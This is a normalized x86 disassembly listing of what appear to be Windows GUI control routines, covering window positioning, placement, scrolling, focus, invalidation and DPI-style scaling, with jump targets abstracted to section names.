call sub_4483f8
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_495a68
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4483f8
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_495a8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4483f8
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_495ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_490380
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_4925c4
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_492ec4
sub_495afc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb050
mov eax esi
call sub_4925c4
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_495b20
push ebx
push esi
push ecx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc1
call sub_4483f8
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_48e6b4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
push 0x1
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
call sub_449db8
push eax
call LoadKeyboardLayoutW
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
push 0x1
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
call sub_449db8
push eax
call LoadKeyboardLayoutW
jmp r-xdata
sub_495bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4934ac
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4904f8
sub_495c10
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4930c8
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_492298
pop ebx
retn
sub_495c68
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_492298
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x24c ]
push eax
call EnableWindow
sub_495cd8
push ebx
mov ebx eax
mov eax ebx
call sub_490260
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_4925c4
pop ebx
retn
push 0x0
mov eax [ ebx + 0x64 ]
call sub_46d5ec
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_48f2b0
sub_495d14
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_48c3fc
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_496868
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_48f2b0
sub_495d54
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_496c14
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_496868
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_495d94
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_4925c4
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x24c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_49676c
sub_495dd4
push ebx
mov ebx eax
cmp [ ebx + 0x1e5 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x1e1 ]
mov eax ebx
call sub_496a44
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_496a44
jmp r-xdata
mov [ ebx + 0x1e5 ] 0x1
sub_495e14
push ebx
mov ebx eax
cmp [ ebx + 0x1e6 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov [ ebx + 0x1e6 ] 0x1
movzx edx [ eax + 0x254 ]
mov eax ebx
call sub_495308
sub_495e60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_48ecf4
jmp r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax esi
call sub_48dac0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_4933e8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_495ee8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_490408
mov edx esi
mov eax ebx
call sub_492554
pop esi
pop ebx
retn
sub_495f04
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_48a798
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov dl 0x1
mov eax [ esp ]
call sub_477028
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd7
call sub_4483f8
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffa4
call sub_4483f8
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffee
call sub_4483f8
test al al
jne r-xdata
sub_495f9c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_497c28
mov edx esi
mov eax ebx
call sub_495f04
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_48f2b0
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_48f2b0
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_48f2b0
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_477028
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_48f2b0
test eax eax
jne r-xdata
jmp r-xdata
sub_496080
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movzx edi [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_48f2b0
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4960d4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_48f2b0
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_477028
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_48f2b0
test eax eax
jne r-xdata
sub_496124
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_495f04
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_48f2b0
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_477028
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_48f2b0
test eax eax
jne r-xdata
sub_496180
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_477028
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_48f2b0
mov [ esi + 0xc ] eax
sub_4961b4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x24c ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_48d40c
mov eax ebx
call sub_490e18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_48d81c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x24c ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_496290
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4924f8
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4483f8
inc edi
dec ebx
jne r-xdata
sub_4962d8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x1b4 ]
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_49c74c
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_49c74c
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_49c74c
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_49c74c
sub_49635c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492038
xor eax eax
push ebp
push sub_496406
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_496290
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48db98
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4962d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49640d
mov eax [ ebp - 0x4 ]
call sub_492040
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
sub_496414
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x24c ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x24c ]
push eax
call ScrollWindow
mov eax edi
call sub_492060
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4924f8
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x24c ]
push eax
call SetWindowPos
sub_496504
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x1d4 ]
test edx edx
je r-xdata
mov eax [ eax + 0x1d8 ]
mov edx ebx
call sub_424744
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x24c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1d8 ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x1d8 ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x24c ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4245dc
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d8 ]
mov ecx ebx
mov edx esi
call sub_424768
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4246e8
call sub_496868
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4246e8
call sub_496868
sub_4965dc
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x24c ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x1d8 ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_496504
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x1d4 ]
test esi esi
je r-xdata
sub_49663c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_496868
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_496868
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x24c ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
test eax eax
jne r-xdata
sub_4966a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_48f2b0
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x24c ]
push eax
call InvalidateRect
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax ebx
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4924f8
mov edx [ eax ]
call [ edx + 0x80 ]
mov edx esi
mov eax ebx
call sub_4924f8
test [ eax + 0x52 ] 0x4
je r-xdata
sub_49676c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_48d81c
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x24c ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4967a4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov dl 0x1
mov eax ebx
call sub_477028
mov esi eax
test esi esi
je r-xdata
movzx eax [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_4967e4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
mov edx ebx
call sub_47bfdc
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477038
mov eax ebx
call sub_496868
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_496820
push ebx
mov ebx eax
cmp [ ebx + 0x24c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x24c ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_496844
push ebx
mov ebx eax
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
call sub_496844
sub_49687c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
push 0x0
push esi
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_432a2c
mov eax [ esp ]
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
mov [ esp + 0x4 ] 0x0
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi ]
jge r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi ] eax
inc [ esp + 0x4 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0x8 ]
jle r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0xc ]
jle r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0x8 ] ebp
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0xc ] ebp
sub_4969b0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_496868
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4969e8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
sub_496aac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x1d0 ]
mov edx ebx
call sub_424744
pop esi
pop ebx
retn
sub_496ad0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_496aac
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x1d0 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4245dc
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d0 ]
mov ecx ebx
call sub_424768
sub_496b44
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1e0 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1e0 ] bl
mov eax esi
call sub_496c14
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_48f2b0
push 0xfffffff0
mov eax [ esi + 0x24c ]
push eax
call GetWindowLongW
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x24c ]
push eax
call SetWindowLongW
or eax 0x10000
sub_496ba4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_496c08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1e3 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_496c0f
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov [ ebx + 0x1e3 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4483f8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1c0 ]
call sub_44b8f0
sub_496c20
push ebx
push esi
push edi
add esp 0xffffffbc
mov ebx eax
mov eax [ ebx + 0x24c ]
push eax
call IsIconic
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call GetWindowRect
mov [ esp + 0x18 ] 0x2c
lea eax [ esp + 0x18 ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x34 ]
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_48d40c
add esp 0x44
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x24c ]
push eax
call GetWindowLongW
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x24c ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
push esp
push esi
call ScreenToClient
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
push esp
push esi
call ScreenToClient
mov eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x14 ] eax
sub_496d18
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x1d0 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x1d0 ]
mov edx [ esp + 0x4 ]
call sub_4246e8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_424590
mov edx [ esp ]
mov eax ebx
mov si 0xffb2
call sub_4483f8
